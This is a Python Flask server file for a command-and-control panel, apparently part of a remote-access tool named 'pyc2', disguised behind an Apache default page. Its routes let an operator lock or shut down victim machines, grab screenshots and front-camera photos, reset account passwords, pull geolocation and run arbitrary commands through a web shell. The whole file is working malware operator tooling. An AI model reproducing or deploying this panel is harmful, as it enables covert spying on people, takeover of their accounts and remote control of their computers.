import glob
import tempfile
import os
import base64
from core.c2 import CommandAndControl
from core.misc import Misc
from core.auth import Auth, TwoFactorAuth
from core.portal import App
from flask import  render_template, request, url_for, redirect
from waitress import serve


app = App()
app.debug = False
app_instance = app.create_app()
c2 = CommandAndControl()
helper = Misc()
app_auth = Auth('dummypass')
mfa = TwoFactorAuth()

@app_instance.route('/', methods=['GET'])
def index():
    return render_template('apache.html')


@app_instance.route('/login', methods=['GET','POST'])
def login():
    error = None
    if request.method == 'POST':
        password = request.form['password']
        global app_auth 
        app_auth = Auth(password)
        app_auth.authenticate()
        if not app_auth.isAuthenticated:
            error = 'Invalid Credentials. Please try again.'
        else:
            if app_auth.is_2fa_enabled:
                return redirect(url_for('twofactorauth'))
            return redirect(url_for('dashboard'))
    return render_template('apache.html', error=error)


@app_instance.route('/dashboard', methods=['GET'])
def dashboard():
    if app_auth.isAuthenticated:
        return render_template('console.html', app_auth=app_auth)
    else:
        return redirect(url_for('login'))

@app_instance.route('/2FA', methods=['GET','POST'])
def twofactorauth():
    global app_auth
    app_auth.revoke_authentication()
    if app_auth.is_2fa_enabled:
        if request.method == 'POST':
            code = request.form['2facode']
            if mfa.verify_key(code):
                app_auth.isAuthenticated = True
                return redirect(url_for('dashboard'))
            else:
                error='Wrong 2FA Code.'
                app_auth.revoke_authentication()
                return render_template('apache.html', error=error)
        else:
            mfa.key_gen()
            mfa.send_key()
            return render_template('2factor.html')
    else:
        return redirect(url_for('index'))


@app_instance.route('/consolee', methods=['GET', 'POST'])
def consolee():
    error = None
    message = None
    global app_auth
    if app_auth is None:
        error = 'Access denied'
        return render_template('error.html', error=error)
    if not app_auth.isAuthenticated:
        return redirect(url_for('index'))
    else:
        if request.method == 'POST':
            command = request.form['command']
            if command =='lock':
                c2.lock_client()
                message = 'Client Locked'
                return render_template('result.html', error=error,message=message)
            elif command =='shutdown':
                c2.shutdown_client()
                message = 'Client is shutting down'
                return render_template('result.html', error=error,message=message)
            elif command =='getss':
                c2.getss()
                message = 'Screenshot captured successfully'
                return render_template('result.html', error=error,message=message)
            elif command =='change-password':
                username = request.form['username']
                new_password = request.form['new-password']
                c2.set_password(username,new_password)
                if c2.verify_success(username,new_password):
                    message = 'Password changed successfully'
                    return render_template('result.html', error=error,message=message)
                else:
                    error = 'An error occurred'
                    return render_template('result.html', error=error,message=error)
            elif command == 'showss':
                return redirect(url_for('showss'))
            
            elif command == 'geo-stuff':
                return redirect(url_for('geo'))
            
            elif command == 'shell':
                return redirect(url_for('shell'))

            elif command == 'grabfrontcam':
                c2.getfrontcam()
                message = 'Picture captured successfully'
                return render_template('result.html', error=error,message=message)
            

            elif command == 'showfcam':
                return redirect(url_for('showfcam'))
        return render_template('console.html', error=error,message=message)


@app_instance.route('/result', methods=['GET', 'POST'])
def result():
    render_template('result.html')


@app_instance.route('/logout', methods=['GET'])
def logout():
    app_auth.revoke_authentication()
    return redirect(url_for('index'))


@app_instance.route('/showss', methods=['GET'])
def showss():
    if not app_auth.isAuthenticated:
        return redirect(url_for('index'))
    ss = []
    for file in glob.glob(f"{tempfile.gettempdir()}\\*.png"):
        if os.path.basename(file).startswith('pyc2ss'):
            with open(file, 'rb') as img:
                b64_img = base64.b64encode(img.read())
                ss.append(b64_img.decode())
    return render_template('showss.html',ss=ss)


@app_instance.route('/showfcam', methods=['GET'])
def showfcam():
    if not app_auth.isAuthenticated:
        return redirect(url_for('index'))
    pix = []
    for file in glob.glob(f"{tempfile.gettempdir()}\\*.png"):
        if os.path.basename(file).startswith('pyc2webcam'):
            with open(file, 'rb') as img:
                b64_img = base64.b64encode(img.read())
                pix.append(b64_img.decode())
    return render_template('showfcam.html',pix=pix)


@app_instance.route('/geo', methods=['GET', 'POST'])
def geo():
    if not app_auth.isAuthenticated:
        return redirect(url_for('index'))   
    geo = c2.get_geo_suff()
    return render_template('geostuff.html', geo=geo)


@app_instance.route('/shell', methods=['GET', 'POST'])
def shell():
    if not app_auth.isAuthenticated:
        return redirect(url_for('index'))
    if request.method == 'POST':
        cmd = request.form['cmd']
        cmd = c2.shell(cmd)
        return render_template('webshell.html', cmd=cmd)
    else:
        cmd = ()
        return render_template('webshell.html', cmd=cmd)

@app_instance.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app_instance.errorhandler(500)
def page_not_found(e):
    return render_template('500.html'), 500


if __name__ == '__main__':
    #app.run()
    serve(app=app_instance, host=helper.config_parser('host'),port=helper.config_parser('port'))
